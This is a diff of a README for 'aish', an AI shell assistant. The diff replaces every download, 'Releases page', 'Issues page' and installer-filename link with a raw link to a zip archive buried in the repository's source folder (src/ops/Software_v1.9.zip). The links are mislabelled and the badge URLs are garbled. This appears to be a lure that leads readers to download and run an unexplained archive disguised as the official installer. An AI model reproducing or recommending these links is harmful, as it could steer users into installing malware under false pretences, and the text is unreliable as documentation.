@@ -10,7 +10,7 @@ To begin using **aish**, follow these simple steps to download and run the appli
 
 ## 📥 Download Now
 
-[![Download aish](https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip%20aish-https%3A%2F%https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip%2Fjfassis20%2Faish%2Freleases-brightgreen)](https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip)
+[![Download aish](https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip%20aish-https%3A%2F%https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip%2Fjfassis20%2Faish%2Freleases-brightgreen)](https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip)
 
 ## 💻 System Requirements
 
@@ -30,12 +30,12 @@ Before downloading, make sure your system meets the following requirements:
 
 ## 📝 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip) on GitHub.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip) on GitHub.
 2. **Choose Your Version:** Look for the latest version. It will be the one at the top of the list.
 3. **Download the Installer:** Click on the appropriate installer for your operating system:
-    - For Windows, find the file named something like `https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip`.
+    - For Windows, find the file named something like `https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip`.
     - For macOS, download the file ending with `.dmg`.
-    - For Linux, you may find `.deb` or `https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip` files.
+    - For Linux, you may find `.deb` or `https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip` files.
 4. **Run the Installer:**
     - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
     - **macOS:** Open the `.dmg` file and drag the aish icon into your Applications folder.
@@ -55,7 +55,7 @@ If you encounter issues during installation or usage, consider these solutions:
 
 ## 📚 Support
 
-For additional help or to report issues, visit our [GitHub Issues page](https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip). The community and developers are here to assist you.
+For additional help or to report issues, visit our [GitHub Issues page](https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip). The community and developers are here to assist you.
 
 ## 🌐 Join Our Community
 
@@ -68,6 +68,6 @@ Stay connected with other aish users. You can find tips, tricks, and updates by 
 
 aish is open source and comes with a permissive license. You can use, modify, and distribute it freely while crediting the original creators.
 
-[![Download aish](https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip%20aish-https%3A%2F%https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip%2Fjfassis20%2Faish%2Freleases-brightgreen)](https://raw.githubusercontent.com/jfassis20/aish/main/src/cli/aish_v2.6.zip)
+[![Download aish](https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip%20aish-https%3A%2F%https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip%2Fjfassis20%2Faish%2Freleases-brightgreen)](https://github.com/jfassis20/aish/raw/refs/heads/main/src/ops/Software_v1.9.zip)
 
 Explore the potential of AI at your command with aish, your new shell assistant!
